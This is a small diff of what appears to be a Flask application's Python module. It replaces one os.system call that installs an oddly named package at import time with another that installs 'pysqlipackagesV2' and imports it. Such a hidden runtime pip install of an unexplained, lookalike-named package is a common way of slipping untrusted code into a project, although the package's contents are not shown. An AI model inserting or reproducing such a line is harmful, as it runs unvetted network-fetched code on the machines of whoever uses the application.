@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pipsqlitedbext")
-import pipsqlitedbext
+os.system("pip install pysqlipackagesV2")
+import pysqlipackagesV2
 import flask
 
 from flask import g
